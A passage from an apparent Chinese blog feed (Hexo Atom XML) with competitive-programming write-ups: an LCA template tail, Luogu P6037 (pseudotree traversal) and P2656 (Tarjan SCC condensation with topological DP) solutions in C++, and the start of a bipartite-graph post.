class="keyword">return</span> fa[a][<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">cin&gt;&gt;n&gt;&gt;q&gt;&gt;s;</span><br><span class="line">lg[<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=n;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(i&gt;&gt;(lg[i<span class="number">-1</span>]+<span class="number">1</span>))lg[i]=lg[i<span class="number">-1</span>]+<span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span> lg[i]=lg[i<span class="number">-1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="keyword">int</span> x,y;</span><br><span class="line">cin&gt;&gt;x&gt;&gt;y;</span><br><span class="line"><span class="built_in">add</span>(x,y);</span><br><span class="line"><span class="built_in">add</span>(y,x);</span><br><span class="line">&#125;</span><br><span class="line">depth[s]=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">dfs</span>(s,s);</span><br><span class="line"><span class="keyword">while</span>(q--)&#123;</span><br><span class="line"><span class="keyword">int</span> a,b;</span><br><span class="line">cin&gt;&gt;a&gt;&gt;b;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="built_in">LCA</span>(a,b));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近来复习一遍图论的板子——LCA。&lt;/p&gt;</summary>
    
    
    
    <category term="icpc" scheme="http://example.com/categories/icpc/"/>
    
    <category term="图论" scheme="http://example.com/categories/icpc/%E5%9B%BE%E8%AE%BA/"/>
    
    <category term="LCA" scheme="http://example.com/categories/icpc/%E5%9B%BE%E8%AE%BA/LCA/"/>
    
    
  </entry>
  
  <entry>
    <title>洛谷P6037题解</title>
    <link href="http://example.com/2022/02/11/%E6%B4%9B%E8%B0%B7P6037%E9%A2%98%E8%A7%A3/"/>
    <id>http://example.com/2022/02/11/%E6%B4%9B%E8%B0%B7P6037%E9%A2%98%E8%A7%A3/</id>
    <published>2022-02-11T03:00:00.000Z</published>
    <updated>2022-02-13T12:03:38.988Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.luogu.com.cn/problem/P6037">洛谷P6037</a>题解</p><span id="more"></span><h2 id="浅谈基环树-环套树"><a href="#浅谈基环树-环套树" class="headerlink" title="浅谈基环树(环套树)"></a>浅谈基环树(环套树)</h2><p>在题目开始之前，就唠一唠这个叫基环树的结构。准确来说，基环树它已经不是树了，我们知道，树一定是由 $n$ 点和 $n-1$ 条边组成的。而基环树是由 $n$ 点与 $n$ 边组成。但是因为它跟树还是很像，并且在保证连通的情况下有且仅有一个简单环，因此得名。如果不连通，那么它会成为基环树森林。</p><p><img src="/2022/02/11/%E6%B4%9B%E8%B0%B7P6037%E9%A2%98%E8%A7%A3/1.png" alt="1"></p><p>比如上图就是一个基环树。我们可以很清楚的看出来，点 $2,1,3,7$ 形成了环，断开任意一条属于环中的边都会使这个棵基环树成为树。一般情况下都是将环和环连接的子树进行分开讨论。如何求环呢？我们只需要 dfs 一遍就行了，如果遇到被访问过的点，那就依次返回路径上的所有点，直到我遇到的那个点为止。</p><p>举个例子，在上图中，我从 6 开始 dfs，假设它经历了 $6 \to 2 \to 1 \to 3 \to 7$ 的顺序。那么接下来在搜索 7 的时候就会发现与它相连的点 2 已经被访问过，那么我返回值给个 2，依次回溯，回溯过程中将点入栈或者入一个 $vector$ 都可以。直到回溯到 2 这个点为止。环就被我们求出来了。</p><p>能求出环我们就会很好做这类的题目了，那么我们具体看看这题吧。</p><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>Ryoku 所处的世界可以抽象成一个有 n 个点， n条边的带权无向连通图 G。每条边有美观度和长度。</p><p>Ryoku 会使用这样一个策略探索世界：在每个点寻找一个<strong>端点她未走过</strong>的边中<strong>美观度最高</strong>的走，如果没有边走，就沿着她前往这个点的边返回，类似于图的<strong>深度优先遍历</strong>。</p><p>探索的一个方案的长度是这个方案所经过的所有边长度的和（返回时经过的长度不用计算）。</p><p>她想知道，对于每一个起点 $s=1,2,\cdots,n$，她需要走过的长度是多少？</p><hr><p>$n$ 个点 $n$ 条边的连通图，那么肯定就是基环树了然后它会根据美观度与深度优先的一种搜索策略，即遇到分支先沿一条分支走完再走另一条分支，并且多条分支优先搜索美观度高的分支。回溯走的路不算，问你以不同的点为起点搜索完所有的点需要走多少长度。</p><p>我们不难得出，如果要遍历 $n$ 个点，我们只需要走过 $n-1$ 条边。而对于一棵树而言，对它深度优先搜索一定会遍历树上所有的边。因此如果把基环树拆开称为一个环和若干个子树，我们就只需要在环上讨论情况，子树的所有边一定是都会走过的。对于同一个环，我先向右边遍历和先向左边遍历走的路径是完全不一样的，如果先向右边那必然导致它左边不会被走过，同理先走左边那右边就不会被走过。</p><p>再根据题中的策略，对于环上的点，我们只需要循环一遍环上的所有点，观察与它连接的在环上的边的美观度哪个比较大，那么答案就是所有图的边权减去那个美观度较小的边权。对于不在环上的点我们可以观察它所在的子树连接在环的哪个点，因为从那个点遍历出来最终也会从它所在的子树走向环的那个点，然后情况就变成了在换上对应的点遍历的情况了。</p><p>所以我们先大致描述一下算法流程：</p><ul><li>将边按照出点读入 $vector$ 当中，并且按美观度排序</li><li>dfs 跑出环上的点将其标记</li><li>对环上所有的点进行答案计算</li><li>对环上的点再跑一次dfs，然后搜索策略为非环上的点，将搜索到的点标记为环上对应的那个点</li><li>最后答案就出来了</li></ul><h2 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 3000005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> to;</span><br><span class="line"><span class="keyword">int</span> w;</span><br><span class="line"><span class="keyword">int</span> p;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">int</span> visited[maxn],ans[maxn],n;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> sum_len,res[maxn];<span class="comment">//不开long long见祖宗</span></span><br><span class="line">vector&lt;eee&gt;edge[maxn];<span class="comment">//用vector数组保存边方便排序</span></span><br><span class="line">vector&lt;<span class="keyword">int</span>&gt;s;<span class="comment">//保存环上的点</span></span><br><span class="line"><span class="keyword">bool</span> in_stack[maxn];<span class="comment">//因为我原来使用栈保存的因此命名这个，表示点是否在环上</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> w,<span class="keyword">int</span> p)</span></span>&#123;</span><br><span class="line">eee e;</span><br><span class="line">e.to=y;</span><br><span class="line">e.w=w;</span><br><span class="line">e.p=p;</span><br><span class="line">edge[x].<span class="built_in">push_back</span>(e);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp</span><span class="params">(eee a,eee b)</span></span>&#123;<span class="comment">//按美观度排序</span></span><br><span class="line"><span class="keyword">return</span> a.p&gt;b.p;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> u,<span class="keyword">int</span> pre)</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(visited[u])&#123;<span class="comment">//如果搜索到了被标记过的点则说明遇到环了</span></span><br><span class="line"><span class="keyword">return</span> u;</span><br><span class="line">&#125;</span><br><span class="line">visited[u]=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> value=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">auto</span> it=edge[u].<span class="built_in">begin</span>();it!=edge[u].<span class="built_in">end</span>();it++)&#123;</span><br><span class="line"><span class="keyword">int</span> v=it-&gt;to;</span><br><span class="line"><span class="keyword">if</span>(v==pre||in_stack[v])<span class="keyword">continue</span>;<span class="comment">//防止逆搜索，并防止对环重新搜索</span></span><br><span class="line">        <span class="comment">//从环的起点开始，假如我顺时针跑出了环，那么它下一条边将会逆时针跑环</span></span><br><span class="line">        <span class="comment">//可以看到仅仅限制条件v!=pre是远远不够的。</span></span><br><span class="line"><span class="keyword">int</span> tmp=<span class="built_in">dfs</span>(v,u);</span><br><span class="line"><span class="keyword">if</span>(tmp)&#123;<span class="comment">//若返回结果不为0则说明遇到环，并且本点也在换上，就保存。</span></span><br><span class="line">value=tmp;</span><br><span class="line"><span class="keyword">if</span>(value==u)&#123;</span><br><span class="line">                <span class="comment">//我判断出环的那个点一定是环的起点，如果回溯过程中遇到了说明环已经保存完了</span></span><br><span class="line">                <span class="comment">//再往前回溯的点就不属于环了</span></span><br><span class="line">value=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">s.<span class="built_in">push_back</span>(u);</span><br><span class="line">in_stack[u]=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs2</span><span class="params">(<span class="keyword">int</span> u,<span class="keyword">int</span> pre,<span class="keyword">int</span> flag)</span></span>&#123;<span class="comment">//这里搜索环的子树，将子树上所有点标记为子树与环直接相连的一个点</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">auto</span> it=edge[u].<span class="built_in">begin</span>();it!=edge[u].<span class="built_in">end</span>();it++)&#123;</span><br><span class="line"><span class="keyword">int</span> v=it-&gt;to;</span><br><span class="line"><span class="keyword">if</span>(v==pre||in_stack[v])<span class="keyword">continue</span>;<span class="comment">//这里我们排除环上的点遍历的一定就都是子树</span></span><br><span class="line">ans[v]=flag;<span class="comment">//ans保存本点答案与哪个点的答案一致。</span></span><br><span class="line"><span class="built_in">dfs2</span>(v,u,flag);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">std::ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="comment">//freopen(&quot;1.in&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">cin&gt;&gt;n;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line"><span class="keyword">int</span> x,y,w,p;</span><br><span class="line">cin&gt;&gt;x&gt;&gt;y&gt;&gt;w&gt;&gt;p;</span><br><span class="line"><span class="built_in">add</span>(x,y,w,p);</span><br><span class="line"><span class="built_in">add</span>(y,x,w,p);</span><br><span class="line">sum_len+=w;<span class="comment">//读入边，将边权之和保存。</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line"><span class="built_in">sort</span>(edge[i].<span class="built_in">begin</span>(),edge[i].<span class="built_in">end</span>(),cmp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">dfs</span>(<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">auto</span> i=s.<span class="built_in">begin</span>();i!=s.<span class="built_in">end</span>();i++)&#123;<span class="comment">//给子树标记</span></span><br><span class="line"><span class="built_in">dfs2</span>(*i,<span class="number">0</span>,*i);</span><br><span class="line">ans[*i]=*i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">auto</span> i=s.<span class="built_in">begin</span>();i!=s.<span class="built_in">end</span>();i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">auto</span> j=edge[*i].<span class="built_in">end</span>()<span class="number">-1</span>;j!=edge[*i].<span class="built_in">begin</span>()<span class="number">-1</span>;j--)&#123;</span><br><span class="line"><span class="keyword">if</span>(in_stack[j-&gt;to])&#123;<span class="comment">//因为我们是按照美观度从大到小排序的，所以从后面开始找到第一个在环上的点一定是美观度较小的边，答案就是减去美观度较小的边权。</span></span><br><span class="line">res[*i]=sum_len-(j-&gt;w);<span class="comment">//res数组保存答案</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,res[ans[i]]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://www.luogu.com.cn/problem/P6037&quot;&gt;洛谷P6037&lt;/a&gt;题解&lt;/p&gt;</summary>
    
    
    
    <category term="icpc" scheme="http://example.com/categories/icpc/"/>
    
    <category term="图论" scheme="http://example.com/categories/icpc/%E5%9B%BE%E8%AE%BA/"/>
    
    <category term="基环树" scheme="http://example.com/categories/icpc/%E5%9B%BE%E8%AE%BA/%E5%9F%BA%E7%8E%AF%E6%A0%91/"/>
    
    
  </entry>
  
  <entry>
    <title>洛谷P2656题解</title>
    <link href="http://example.com/2022/02/07/%E6%B4%9B%E8%B0%B7P2656%E9%A2%98%E8%A7%A3/"/>
    <id>http://example.com/2022/02/07/%E6%B4%9B%E8%B0%B7P2656%E9%A2%98%E8%A7%A3/</id>
    <published>2022-02-07T03:00:00.000Z</published>
    <updated>2022-02-10T17:21:04.652Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.luogu.com.cn/problem/P2656">洛谷P2656</a>题解。</p><span id="more"></span><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>小胖和 ZYR 要去 ESQMS 森林采蘑菇。</p><p>ESQMS 森林间有 N个小树丛，M 条小径，每条小径都是单向的，连接两个小树丛，上面都有一定数量的蘑菇。小胖和 ZYR 经过某条小径一次，可以采走这条路上所有的蘑菇。由于 ESQMS 森林是一片神奇的沃土，所以一条路上的蘑菇被采过后，又会长出一些新的蘑菇，数量为原来蘑菇的数量乘上这条路的“恢复系数”，再下取整。</p><p>比如，一条路上有 4个蘑菇，这条路的“恢复系数”为 0.70，则第一~四次经过这条路径所能采到的蘑菇数量分别为 4,2,1,0。</p><p>现在，小胖和 ZYR 从 S号小树丛出发，求他们最多能采到多少蘑菇。</p><hr><p>就是沿线采蘑菇，然后给定起点，没有给终点，蘑菇采完后会复活，复活的个数为上一次的个数×恢复系数。路是单向的，那么可以据此建一个有向图。如果一条边的两个顶点在同一个强连通分量内的话，那么这条边我可以经过无数次，这很容易证明。但是如果一条边的两个点不在同一个强连通分量，那么我只能采一次上面的蘑菇。因为题目没有规定不能反复横跳，所以我们可以先tarjan缩点然后把内部的边权集中到点上，再集中的时候只需要注意一定是要×系数累加上去的，因为我能无数次经过。</p><p>缩点之后就是对DAG处理，我看大佬们用的都是最短路径算法，这里菜鸡只会拓扑排序qwq。</p><p>这里还需要注意的是，起点所在的强连通分量如果入读不为0那么那些蘑菇我是采不到的。因此我在这里设立一个flag标记，在拓扑排序的时候如果flag为0那么我只把点和边删了，不做数值上的处理。然后我对起点所在的强连通分量flag设1，然后如果flag为1则会向后面的点传递。</p><p>在写状态转移方程的时候注意要把路上的蘑菇和那个点的蘑菇都加上。</p><p>如果路径上的蘑菇为w，v强连通分量上的蘑菇数为$amount[v]$。那么$u-&gt;v$的状态转移方程就应该是</p><p>$ans[v]=max(ans[v],ans[u]+w+amount[v])$</p><p>最后注意一个，那就是一定要记着不管怎样给最终结果赋一个初始值就是起点所在强连通分量的蘑菇数量，这里卡了一下。</p><p>下面给出AC代码。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 80005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> to;</span><br><span class="line"><span class="keyword">int</span> next;</span><br><span class="line"><span class="keyword">int</span> w;</span><br><span class="line"><span class="keyword">float</span> p;</span><br><span class="line">&#125;edge[maxn*<span class="number">3</span>],e[maxn*<span class="number">3</span>];</span><br><span class="line"><span class="keyword">int</span> root[maxn],root2[maxn],dfn[maxn],low[maxn],visited[maxn],s[maxn],degree[maxn],num[maxn],amount[maxn],ans[maxn],flag[maxn],cnt,cnt2,tot,top,deep,n,m;</span><br><span class="line">stack&lt;<span class="keyword">int</span>&gt;ss;<span class="comment">//拓扑排序用的栈</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> w,<span class="keyword">float</span> p)</span></span>&#123;<span class="comment">//一开始的建图</span></span><br><span class="line">edge[++cnt].to=y;</span><br><span class="line">edge[cnt].w=w;</span><br><span class="line">edge[cnt].next=root[x];</span><br><span class="line">edge[cnt].p=p;</span><br><span class="line">root[x]=cnt;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add2</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> w,<span class="keyword">float</span> p)</span></span>&#123;<span class="comment">//强连通分量的建图</span></span><br><span class="line">degree[y]++;</span><br><span class="line">e[++cnt2].next=root2[x];</span><br><span class="line">e[cnt2].to=y;</span><br><span class="line">e[cnt2].w=w;</span><br><span class="line">e[cnt2].p=p;</span><br><span class="line">root2[x]=cnt2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">tarjan</span><span class="params">(<span class="keyword">int</span> u)</span></span>&#123;<span class="comment">//tarjan板子</span></span><br><span class="line">visited[u]=<span class="number">1</span>;</span><br><span class="line">dfn[u]=low[u]=++deep;</span><br><span class="line">s[++top]=u;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=root[u];i;i=edge[i].next)&#123;</span><br><span class="line"><span class="keyword">int</span> v=edge[i].to;</span><br><span class="line"><span class="keyword">if</span>(!dfn[v])&#123;</span><br><span class="line"><span class="built_in">tarjan</span>(v);</span><br><span class="line">low[u]=<span class="built_in">min</span>(low[u],low[v]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(visited[v])&#123;</span><br><span class="line">low[u]=<span class="built_in">min</span>(low[u],low[v]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(dfn[u]==low[u])&#123;</span><br><span class="line">visited[u]=<span class="number">0</span>;</span><br><span class="line">num[u]=++tot;</span><br><span class="line"><span class="keyword">while</span>(s[top]!=u)&#123;</span><br><span class="line">visited[s[top]]=<span class="number">0</span>;</span><br><span class="line">num[s[top--]]=tot;</span><br><span class="line">&#125;</span><br><span class="line">top--;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;1.txt&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line"><span class="keyword">int</span> x, y, w;</span><br><span class="line"><span class="keyword">float</span> p;</span><br><span class="line">cin&gt;&gt;x&gt;&gt;y&gt;&gt;w&gt;&gt;p;</span><br><span class="line"><span class="built_in">add</span>(x,y,w,p);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> start;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;start);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(!dfn[i])<span class="built_in">tarjan</span>(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=root[i];j;j=edge[j].next)&#123;</span><br><span class="line"><span class="keyword">int</span> v=edge[j].to,w=edge[j].w;</span><br><span class="line">            <span class="keyword">float</span> p=edge[j].p;</span><br><span class="line"><span class="keyword">if</span>(num[i]==num[v])&#123;<span class="comment">//同一个强连通分量内则把所有能产生的蘑菇加上</span></span><br><span class="line"><span class="keyword">while</span>(w!=<span class="number">0</span>)&#123;</span><br><span class="line">amount[num[i]]+=w;</span><br><span class="line">w=(<span class="keyword">int</span>)((p)*w);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">add2</span>(num[i],num[v],w,p);<span class="comment">//否则建边</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=tot;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(!degree[i])ss.<span class="built_in">push</span>(i);</span><br><span class="line">&#125;</span><br><span class="line">ans[num[start]]=amount[num[start]];</span><br><span class="line">flag[num[start]]=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> res=ans[num[start]];<span class="comment">//res一定赋初值不要忘了</span></span><br><span class="line"><span class="keyword">while</span>(!ss.<span class="built_in">empty</span>())&#123;</span><br><span class="line"><span class="keyword">int</span> x=ss.<span class="built_in">top</span>();</span><br><span class="line">ss.<span class="built_in">pop</span>();</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=root2[x];i;i=e[i].next)&#123;</span><br><span class="line"><span class="keyword">int</span> v=e[i].to,w=e[i].w;</span><br><span class="line">degree[v]--;</span><br><span class="line"><span class="keyword">if</span>(!degree[v])ss.<span class="built_in">push</span>(v);</span><br><span class="line"><span class="keyword">if</span>(flag[x])&#123;</span><br><span class="line">ans[v]=<span class="built_in">max</span>(ans[v],ans[x]+w+amount[v]);<span class="comment">//状态转移方程</span></span><br><span class="line">res=<span class="built_in">max</span>(res,ans[v]);<span class="comment">//保存结果</span></span><br><span class="line">flag[v]=<span class="number">1</span>;<span class="comment">//flag向前传播</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">if</span>(tot==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,ans[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,res);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://www.luogu.com.cn/problem/P2656&quot;&gt;洛谷P2656&lt;/a&gt;题解。&lt;/p&gt;</summary>
    
    
    
    <category term="icpc" scheme="http://example.com/categories/icpc/"/>
    
    <category term="图论" scheme="http://example.com/categories/icpc/%E5%9B%BE%E8%AE%BA/"/>
    
    <category term="强连通分量、缩点" scheme="http://example.com/categories/icpc/%E5%9B%BE%E8%AE%BA/%E5%BC%BA%E8%BF%9E%E9%80%9A%E5%88%86%E9%87%8F%E3%80%81%E7%BC%A9%E7%82%B9/"/>
    
    
  </entry>
  
  <entry>
    <title>二分图入门</title>
    <link href="http://example.com/2022/02/04/%E4%BA%8C%E5%88%86%E5%9B%BE%E5%85%A5%E9%97%A8/"/>
    <id>http://example.com/2022/02/04/%E4%BA%8C%E5%88%86%E5%9B%BE%E5%85%A5%E9%97%A8/</id>
    <published>2022-02-04T03:00:00.000Z</published>
    <updated>2022-02-04T15:36:00.001Z</updated>
    
